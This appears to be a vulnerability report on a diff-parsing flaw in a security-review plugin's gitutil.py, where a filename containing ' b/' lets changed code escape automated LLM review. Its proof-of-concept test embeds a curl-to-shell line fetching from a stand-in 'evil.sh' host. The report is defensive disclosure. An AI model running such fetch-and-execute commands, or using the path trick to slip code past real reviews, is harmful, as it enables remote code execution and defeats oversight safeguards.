### Title
Ambiguous `diff --git a/... b/...` header parsing lets a crafted filename desync path binding from diff content - ([File: plugins/security-guidance/hooks/gitutil.py])

### Summary
`extract_file_paths_from_diff` and `parse_diff_into_files` derive a file's identity solely from a regex match (`^a/(.+?) b/(.+)$`) against the single `diff --git a/X b/Y` header line, rather than from the unambiguous `--- a/X` / `+++ b/Y` lines that follow. Because git's `diff --git` line is a well-known ambiguous concatenation of two paths joined by a literal `" b/"` separator, and this plugin explicitly disables path quoting (`core.fsmonitor=false` aside, `GIT_CMD` never re-enables quoting for spaces, which git never quotes regardless of `core.quotePath`), a file whose path contains the substring `" b/"` (e.g. a directory named `evil b/` containing `foo.py`) causes the non-greedy/greedy regex to split the header at the wrong point, producing a `file_path` that differs from the path git actually associated with the following hunk content.

### Finding Description
Both functions do:
```python
lines = file_diff.split('\n')
header_match = re.match(r'^a/(.+?) b/(.+)$', lines[0])
file_path = header_match.group(2) or header_match.group(1) or ''
``` [1](#0-0) [2](#0-1) 

For a normal file, `lines[0]` is `a/<old> b/<new>`, and when old==new the header is `a/<path> b/<path>`. If `<path>` itself contains the literal substring `" b/"` (a directory such as `evil b/` holding `foo.py`, giving repo path `evil b/foo.py`), the emitted header becomes:
```
a/evil b/foo.py b/evil b/foo.py
```
The regex's non-greedy group 1 (`.+?`) stops at the *first* `" b/"` occurrence rather than the one git actually intended as the separator, so `header_match.group(2)` evaluates to `foo.py b/evil b/foo.py` instead of the real path `evil b/foo.py`. Git itself never escapes spaces or slashes inside path components for this header line (`core.quotePath` only affects non-ASCII/control characters, not spaces), so this ambiguity is inherent to the raw `diff --git` line and is exactly what the more precise `---`/`+++` lines exist to disambiguate — but the parser never consults them.

Consequently:
- `_is_reviewable_source(file_path)` is evaluated against the corrupted string, which can flip the reviewability decision (e.g. turning a `.py` file into something that no longer matches `SOURCE_CODE_EXTENSIONS`/basename rules, or vice versa) [3](#0-2) .
- If the file is (mis-)classified as reviewable, `parse_diff_into_files` still attaches the correct hunk body (`@@ ...` onward) to the *wrong* `file_path` string, because hunk extraction happens independently of the header parse [4](#0-3) .
- If misclassified as non-reviewable, the entire file (and its real content diff) is silently dropped from both the path list (`extract_file_paths_from_diff`) and the LLM-reviewed set (`parse_diff_into_files`), letting attacker-controlled code changes bypass the security review pipeline entirely while the tool believes nothing suspicious changed in that path.

I was not able to fully trace, within the remaining tool budget, the exact call sites in `security_reminder_hook.py` (`handle_commit_review_posttooluse`) that consume the returned `(file_path, diff_content)` tuples to confirm whether any downstream code re-derives the path from `---`/`+++` as a secondary check; the grep only located the import/usage lines, not their surrounding logic. This should be verified before treating impact as fully confirmed for every call path.

### Impact Explanation
This is a security-review bypass / trust-boundary bypass: a contributor whose committed file content is subject to Claude Code's own automated diff review can craft a path to either (a) get their real, potentially malicious diff excluded from the reviewer's input entirely, or (b) cause any findings the LLM does produce to be attributed to a bogus path string, breaking the reviewer's ability to correctly flag/report the actual changed file. Both outcomes let attacker-controlled code changes evade the security-guidance plugin's review, which is the core protection this hook implements.

### Likelihood Explanation
Requires only that the attacker can name/rename a tracked file or directory to include the literal substring `" b/"` in its repo-relative path (fully legal on POSIX and normalized git paths on all platforms) and have it be part of a commit that triggers `handle_commit_review_posttooluse`. No elevated privileges, no social engineering, and no dependency on git internals beyond documented, stable diff-header formatting behavior — highly repeatable and deterministic.

### Recommendation
Do not derive `file_path` from the `diff --git a/... b/...` header via regex splitting. Instead, parse the unambiguous `--- a/<old>` and `+++ b/<new>` lines that immediately follow the header (each line contains exactly one path with a single well-defined prefix), and fall back to the `diff --git` header only when those lines are absent (e.g., mode-only changes) — and even then, prefer git's own `--name-only -z` / `-z`-terminated machine-readable output (already used elsewhere in this file, e.g. `_git_name_only`) over textual header regexing wherever the caller can obtain the diff via a machine-parsable format instead of freeform `-p` text.

### Proof of Concept
Unit test in a suite alongside `gitutil.py`:
```python
def test_ambiguous_b_slash_path_desyncs_binding():
    diff = (
        "diff --git a/evil b/foo.py b/evil b/foo.py\n"
        "index 111..222 100644\n"
        "--- a/evil b/foo.py\n"
        "+++ b/evil b/foo.py\n"
        "@@ -0,0 +1,2 @@\n"
        "+import os\n"
        "+os.system('curl evil.sh | sh')\n"
    )
    files = parse_diff_into_files(diff)
    # Correct path per git's own --- / +++ lines
    assert files and files[0][0] == "evil b/foo.py", (
        f"parser bound content to spoofed path {files[0][0]!r} "
        "instead of the real path 'evil b/foo.py'"
    )
```
Expected today: the assertion fails because `header_match.group(2)` yields `"foo.py b/evil b/foo.py"`, demonstrating the differential between git's actual path and the parser's derived path, and confirming that a crafted filename can desync path/diff binding used for review admission decisions.

def _is_reviewable_source(file_path):
    # Normalize for component matching: a path like `.next/x.js` or
    # `pkg/node_modules/y.ts` should both be excluded; matching against
    # `'/' + path` lets each pattern be checked as `'/' + p in '/' + path`
    # without false-positiving on `rebuild/` matching `build/`.
    norm = "/" + file_path.replace("\\", "/")
    if any(("/" + p) in norm for p in SKIP_PATH_PATTERNS):
        return False
    if file_path.endswith(SKIP_FILE_SUFFIXES):
        return False
    ext = os.path.splitext(file_path)[1].lower()
    if ext in SOURCE_CODE_EXTENSIONS:
        return True
    base = os.path.basename(file_path).lower()
    # Accept dot-suffixed variants too: `Dockerfile.dev`, `Makefile.am`,
    # `Jenkinsfile.release`. splitext gives ext='.dev'/'.am' for these so they
    # miss both the extension check and the exact-basename check otherwise.
    if base in SOURCE_CODE_BASENAMES \
            or base.split(".", 1)[0] in SOURCE_CODE_BASENAMES:
        return True
    # Extensionless files default to reviewable unless they're known
    # plain-text metadata or dotfiles. Covers shebang scripts under bin/ or
    # scripts/ (`deploy`, `run-canary`, `entrypoint`) which carry
    # shell-injection surface but were previously filtered out — the largest
    # remaining false-negative class for extensionless files. Dotfiles (`.gitignore`,
    # `.nvmrc`, `.env`) are config, not code; `.bashrc`-style runnables are
    # rare in repos and not worth the noise. The deny-list is prefix-aware on
    # `-`/`_` so dual-license / i18n variants (`LICENSE-MIT`, `README-CN`)
    # don't fall through as source.
    if ext == "" and not base.startswith("."):
        if any(base == x or base.startswith(x + "-") or base.startswith(x + "_")
               for x in NON_SOURCE_EXTENSIONLESS_BASENAMES):
            return False
        return True
    return False
```
